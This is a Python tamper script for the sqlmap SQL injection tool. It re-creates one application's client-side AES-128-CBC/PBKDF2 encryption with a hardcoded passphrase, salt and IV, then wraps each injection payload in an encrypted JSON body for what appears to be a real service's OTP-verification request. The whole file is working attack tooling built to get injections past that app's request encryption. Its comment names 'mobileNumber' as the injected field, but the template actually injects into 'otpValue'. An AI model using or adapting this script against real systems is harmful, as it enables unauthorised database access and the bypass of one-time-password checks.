#!/usr/bin/env python3

"""
SQLMap Tamper Script for CryptoJS AES Encryption
Matches the logic: PBKDF2(HMAC-SHA1) Key Derivation + AES-128-CBC
"""

from lib.core.enums import PRIORITY
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1, MD5
from Crypto.Util.Padding import pad
import base64
import json
import hashlib

__priority__ = PRIORITY.NORMAL

# ------------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------------
PASSPHRASE = "d6163f0659cfe4196dc03c2c29aab06f10cb0a79cdfc74a45da2d72358712e80"
SALT_STRING = "fc74a45dsalt"
IV_STRING = "c29aab06iv"
ITERATIONS = 100
KEY_SIZE_BYTES = 16 

# --- PAYLOAD TEMPLATE ---
# We use %s as the placeholder for the SQLMap payload.
# Currently set to inject into 'mobileNumber'.
PAYLOAD_TEMPLATE = '{"referenceNumber":"417401185","otpValue":"%s","mobileNumber":"9999999999","userLogData":{"appId":"129","stepId":"02","uniqueId":"9999999999|1763967229"}}'
# ------------------------------------------------------------------------

def dependencies():
    pass

def get_md5_bytes(s):
    return hashlib.md5(s.encode('utf-8')).digest()

def generate_key(passphrase, salt):
    return PBKDF2(
        passphrase, 
        salt, 
        dkLen=KEY_SIZE_BYTES, 
        count=ITERATIONS, 
        hmac_hash_module=SHA1
    )

def encrypt_aes(plaintext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded_data = pad(plaintext.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded_data)
    return encrypted

STATIC_SALT = get_md5_bytes(SALT_STRING)
STATIC_IV = get_md5_bytes(IV_STRING)
STATIC_KEY = generate_key(PASSPHRASE, STATIC_SALT)

def tamper(payload, **kwargs):
    """
    1. Receives injection payload (e.g. "1' OR '1'='1")
    2. Inserts it into the JSON Template
    3. Encrypts the FULL JSON object
    """
    
    if payload:
        try:
            # 1. Insert SQLMap payload into the template
            # This reconstructs the full JSON with the injection inside mobileNumber
            full_json_plaintext = PAYLOAD_TEMPLATE % payload
            
            # 2. Encrypt the FULL JSON
            encrypted_bytes = encrypt_aes(full_json_plaintext, STATIC_KEY, STATIC_IV)
            
            # 3. Return Base64
            encrypted_b64 = base64.b64encode(encrypted_bytes).decode('utf-8')
            
            return encrypted_b64
            
        except Exception as e:
            print(f"[!] Encryption Error in Tamper Script: {e}")
            return payload

    return payload